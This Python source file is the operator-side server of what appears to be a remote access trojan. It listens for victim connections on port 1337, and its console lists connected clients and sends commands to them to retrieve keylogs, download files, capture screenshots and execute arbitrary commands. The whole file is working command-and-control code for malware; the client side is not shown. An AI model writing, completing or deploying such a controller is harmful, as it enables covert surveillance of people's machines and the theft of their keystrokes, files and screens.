import os
import shlex
import socket
import threading
import time

import connection
import utility

COMMANDS = {
    "help": {"description": "Displays this help message"},
    "connections": {
        "description": "Display a list of connected clients",
    },
    "keylogs": {
        "description": "View the keylogs of a session",
        "arguments": ["client_id"],
    },
    "download": {
        "description": "Download a file from a session",
        "arguments": ["client_id", "file_path"],
    },
    "screenshot": {
        "description": "Capture a screenshot from a session",
        "arguments": ["client_id"],
    },
    "execute": {
        "description": "Execute a command on a client",
        "arguments": ["client_id", "command"],
    },
    "exit": {"description": "Shutdown the server and exit"},
}


def command_help() -> str:
    """returns a formatted string of all commands and their descriptions/arguments

    Returns:
        str: formatted string of all commands and their descriptions/arguments
    """
    # a tuple/generator of each commands arguments. commands respective arguments being seperated by a comma.
    arg_str = (", ".join(x.get("arguments", [])) for x in COMMANDS.values())
    # calculate the padding needed to display the arguments in an even column, based on the longest arg_str
    arg_pad = max(len(max(arg_str, key=len)), 9) + 5
    # calculate the padding needed to display the commands in an even column, based on the longest command
    cmd_pad = max(len(max(*COMMANDS.keys(), key=len)), 7) + 5
    # create a formatted string of all commands and their descriptions/arguments. one command per line.
    return (
        f"{'COMMAND':{cmd_pad}}{'ARGUMENTS':{arg_pad}}{'DESCRIPTION'}"
        + "\n\n"
        + "\n".join(
            (
                cmd.ljust(cmd_pad)
                + ", ".join(info.get("arguments", ["-"])).ljust(arg_pad)
                + info.get("description", "-")
            )
            for cmd, info in COMMANDS.items()
        )
    )


class Server(threading.Thread):
    def __init__(self, host: str, port: int) -> None:
        # initialise the threading.Thread superclass
        threading.Thread.__init__(self, daemon=True)
        # set the class address variable to a tuple containing the ip and port the server is listening on
        self.addr = (host, port)
        # create a new socket object
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # attempt to bind the socket to the address info provided in self.addr
            self.sock.bind(self.addr)
        except OSError as e:
            # if the socket fails to bind, print the error and exit the program
            raise OSError(
                "Unable to bind to {}:{}; "
                "This may be because the specified host address is invalid, "
                "or the specified port number is already in use.".format(*self.addr)
            ) from e
        self._next_cid = 1
        # list containing all the connections the server has
        self._connections = []

    def run(self) -> None:
        """override of threading.Thread.run() method. starts the server upon calling .start() on the object"""
        # Start listening for incoming connections
        self.sock.listen()
        # output a message indicating the server is listening for connections
        print(
            utility.padstring(
                "Server Started \ Listening for connections on {}:{}".format(*self.addr)
            )
        )
        # while the server is running
        while True:
            # accept connection from clients
            conn, _ = self.sock.accept()
            # output a message with the client's ip and port
            print(
                utility.padstring(
                    "Connection from {}:{}\n\n#".format(*conn.getpeername()),
                    top=2,
                    bottom=0,
                ),
                end=" ",
            )
            # create a new connection object and add it to the servers list of connections
            self._connections.append(connection.Connection(conn, self._next_cid, self))
            # increment the next_cid variable
            self._next_cid += 1

    def get_connection(self, connection_id: int or str) -> connection.Connection:
        """fetches a client.Connection object relative to the given connection_id.

        Args:
            connection_id (intorstr): the ID number of the client.Connection object to fetch

        Returns:
            connection.Connection: the client.Connection object relative to the given connection_id
        """
        # if connection_id is a number, return the connection with that id
        if isinstance(connection_id, int) or connection_id.isnumeric():
            # using next() to iterate through and check all connections for a match to the connection_id
            return next(
                (x for x in self._connections if x.cid == int(connection_id)), None
            )

    def remove_connection(self, connection: connection.Connection) -> None:
        """remove a connection from the servers list of connections

        Args:
            connection (connection.Connection): connection object to remove
        """
        self._connections = [x for x in self._connections if x != connection]

    def handle_command(self, cmd: str, *args) -> str:
        """handle a command input by the user and return the response

        Args:
            cmd (str): command string executed by the user

        Returns:
            str: the response to the command executed
        """
        # if the arguments passed with the command are not enough for the executed command
        if len(args) < len(COMMANDS.get(cmd, {}).get("arguments", [])):
            # output an error reflecting the issue
            return "Invalid number of arguments for command {}".format(cmd)

        # if the executed command was "connections"
        if cmd == "connections":
            # if there are no connections
            if not self._connections:
                # return a message indicating there are no connections
                return "No connections"
            else:
                # otherwise, return a formatted string of all the connections (ID number, ip address, port)
                longest_id = max(len(str(x.cid)) for x in self._connections)
                return "\n".join(
                    str(x.cid).rjust(longest_id)
                    + " | {}:{}".format(*x.conn.getpeername())
                    for x in self._connections
                )
        else:
            # if the executed command was something that is relative to a specific client
            cid, *args = args
            # get the client.Connection object relative to the given connection_id
            connection = self.get_connection(cid)
            # if the client.Connection object was found
            if connection:
                # execute the command on the client.Connection object and return the response
                return connection.handle_command(cmd, *args)
            else:
                # otherwise, return an error message
                return f'Client with ID "{cid}" does not exist.'


if __name__ == "__main__":
    # initialize a server object of the server thread class
    server = Server("localhost", 1337)
    # start the server thread
    server.start()
    time.sleep(0.5)
    while True:
        try:
            # accept input from the user
            # splitting up arguments using the shlex module
            # assigning the first value to the command variable
            # and subsequent values to the aruments variable
            command, *arguments = shlex.split(input("# "))
        except ValueError:
            continue
        else:
            # if the command isn't in the list of commands
            if command not in COMMANDS.keys():
                # output an error message
                print(utility.padstring("Unknown command: {}".format(command)))
                # go to next loop iteration
                continue

        if command == "exit":
            # exit the application
            break
        elif command == "help":
            # display the command help message
            print(utility.padstring(command_help()))
        else:
            # command must be handled on the server
            # output the response of the command
            print(utility.padstring(server.handle_command(command, *arguments)))
